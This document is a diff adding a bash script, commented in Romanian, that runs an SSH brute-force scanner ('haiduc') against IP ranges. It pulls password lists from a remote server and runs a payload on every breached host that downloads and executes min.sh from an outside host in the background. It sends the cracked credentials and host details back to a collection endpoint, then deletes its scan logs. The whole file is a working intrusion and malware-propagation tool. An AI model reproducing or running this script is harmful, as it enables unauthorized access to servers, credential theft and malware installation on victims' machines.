@@ -1,0 +1,53 @@
+#!/bin/bash
+### Set conexiuni tool ###
+passfile=pass
+threads=300
+port=22
+#
+WHI='[1;37m'
+BLK='[1;30m'
+RED='[1;31m'
+YEL='[1;33m'
+BLU='[1;34m'
+RES='[0m'
+#
+SERVERIP=`curl http://www.karaibe.us/.foo/remote/info.php --connect-timeout 10`
+dir=$(cat dir.dir)
+curl -s http://www.karaibe.us/.foo/feed/feedp.php --connect-timeout 10 > pass
+sleep 1
+sizepass=$(wc -c < pass)
+minsizep=6
+#daca passfile-ul e mai mic decat 6 biti creaza automat passfile si in cazul in care clasa de scan e localhost baga passfile big
+if [ ! $sizepass -ge $minsizep ]; then
+	cat .classpass > pass
+elif [ $1 = 192.168 ]; then
+	cat .pass > pass
+fi
+##################################
+./haiduc $threads -b $1 $passfile $port "cd /tmp; uname -a; curl -O http://www.karaibe.us/.foo/min.sh || wget http://www.karaibe.us/.foo/min.sh || wget http://67.205.129.169/.foo/min.sh; chmod +x min.sh; nohup ./min.sh >> /dev/null &"
+sleep 3
+##################################
+#aici in cazul in care nu a gasit ip pe clasa anterioara schimba clasa pt toate rooturile
+scanlogsize=$(wc -c < scan.log)
+scanlogminsize=200
+if [ ! $scanlogsize -ge $scanlogminsize ]; then
+	curl -s http://www.karaibe.us/.foo/feed/class.php --connect-timeout 10 >> /dev/null
+fi
+##################################
+sleep 60
+sleep 60
+pkill haiduc
+killall -9 haiduc
+gasite=$dir/gasite.txt
+if [ -f $gasite ]; then
+	curl -d "info=HAIDUCSCAN&data=$(whoami)@$SERVERIP\nDATE--->$(date)\nSCANDIR--->$(pwd)-`cat $gasite`" http://www.karaibe.us/.foo/remote/info.php
+	php -f finish.php $gasite HAIDUC-GOOD-FINISHED
+fi
+sleep 10
+pkill haiduc
+pkill haiduc
+killall -9 haiduc
+rm -rf gasite.txt scan.log class
+rm -rf class
+sleep 2
+echo "${RED}[+]${BLK} Brutele TERMINAT.${RES}"
